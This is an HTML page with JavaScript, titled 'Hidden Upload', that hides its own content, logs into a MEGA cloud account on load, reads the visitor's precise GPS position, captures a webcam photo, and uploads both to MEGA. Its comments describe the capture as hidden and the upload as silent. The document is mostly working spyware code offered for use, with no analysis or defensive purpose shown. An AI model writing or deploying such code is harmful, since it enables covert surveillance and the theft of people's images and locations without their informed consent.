<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hidden Upload</title>
    <script src="https://cdn.jsdelivr.net/npm/megaio/mega.js"></script>
    <style>
        body { display: none; } /* Hide the webpage */
    </style>
</head>
<body>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        let megaSession = null;

        // Auto-login to MEGA
        function autoAuthenticateMega() {
            const megaEmail = "your-email@example.com";
            const megaPassword = "your-password";

            const mega = new Mega();
            mega.login(megaEmail, megaPassword)
                .then(session => {
                    megaSession = session;
                    startProcess();
                })
                .catch(error => {});
        }

        // Capture GPS and Camera Data Automatically
        function startProcess() {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const loc = `Latitude: ${lat}, Longitude: ${lng}`;
                    capturePhoto(loc);
                },
                (error) => {
                    alert("Error with GPS: " + error.message);
                },
                { enableHighAccuracy: true, maximumAge: 0 }
            );
        }

        // Capture a hidden photo
        async function capturePhoto(location) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement("video");
                video.srcObject = stream;

                // Ensure video is playing and metadata is loaded
                video.onloadedmetadata = () => {
                    video.play();

                    // Wait for video to actually start playing before capturing
                    video.onplaying = () => {
                        const canvas = document.getElementById("canvas");
                        const ctx = canvas.getContext("2d");
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;

                        // Capture the image from video
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // Stop all media tracks after capturing
                        stream.getTracks().forEach(track => track.stop());

                        // Notify the user that the photo has been captured
                        alert("Photo successfully captured!");

                        // Upload photo to MEGA
                        uploadToMega(canvas, location);
                    };
                };

                video.onerror = (e) => {
                    alert("Error with video capture: " + e.message);
                    stream.getTracks().forEach(track => track.stop());
                };
            } catch (error) {
                alert("Error accessing camera: " + error.message);
            }
        }

        // Upload files silently
        function uploadToMega(canvas, location) {
            if (!megaSession) {
                autoAuthenticateMega();
                return;
            }

            const imageDataUrl = canvas.toDataURL("image/jpeg");
            const imageBlob = dataURLtoBlob(imageDataUrl);
            const locationBlob = new Blob([location], { type: 'text/plain' });

            const mega = new Mega({ session: megaSession });

            mega.upload("photo.jpg", imageBlob)
                .then(() => mega.upload("location.txt", locationBlob))
                .catch((error) => {
                    alert("Error uploading to MEGA: " + error.message);
                });
        }

        function dataURLtoBlob(dataurl) {
            const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
            for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
            return new Blob([u8arr], { type: mime });
        }

        // Automatically start in the background
        window.onload = () => { autoAuthenticateMega(); };
    </script>
</body>
</html>
